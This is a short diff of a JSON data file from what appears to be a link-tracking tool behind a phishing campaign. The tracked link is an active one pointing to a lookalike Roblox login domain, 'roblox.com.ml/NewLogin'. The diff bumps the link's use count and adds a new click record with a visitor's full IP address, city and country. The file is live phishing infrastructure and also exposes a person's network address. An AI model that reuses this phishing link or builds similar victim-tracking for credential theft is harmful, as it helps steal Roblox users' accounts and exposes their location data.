@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 723,
+    "useCount": 724,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5896,6 +5896,14 @@
         "city": "Daugavpils",
         "flag": "🇱🇻",
         "countryCode": "LV"
+      },
+      {
+        "timestamp": 1777140771838,
+        "ip": "88.160.133.7",
+        "country": "France",
+        "city": "Melun",
+        "flag": "🇫🇷",
+        "countryCode": "FR"
       }
     ]
   },
